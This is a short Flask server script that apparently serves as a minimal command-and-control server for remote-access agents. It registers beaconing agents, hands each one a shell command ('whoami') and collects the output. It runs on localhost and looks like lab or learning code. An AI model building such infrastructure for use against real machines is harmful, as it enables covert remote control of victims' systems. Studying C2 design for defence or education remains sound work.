from flask import Flask, request, jsonify, json

app = Flask(__name__)

agents_info = {}

task = "whoami"

@app.route("/beacon", methods=["POST"])
def beacon():
    agent_id = request.json.get('id')
    
    raw_data = request.get_json()
    raw_data.pop('id')

    if agent_id not in agents_info:
        agents_info.update({agent_id: raw_data})

    return jsonify({"status": f"registered {agents_info}"})

@app.route("/task/<agent_id>", methods=["GET"])
def get_task(agent_id):
    print(f"Task for {agent_id} given.")
    return task


@app.route("/result", methods=["POST"])
def result():
    agent_id = request.json.get('id')
    output = request.json.get('output')
    print(f"[+] Result from {agent_id}: {output}")
    return jsonify({"status": "received"})

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)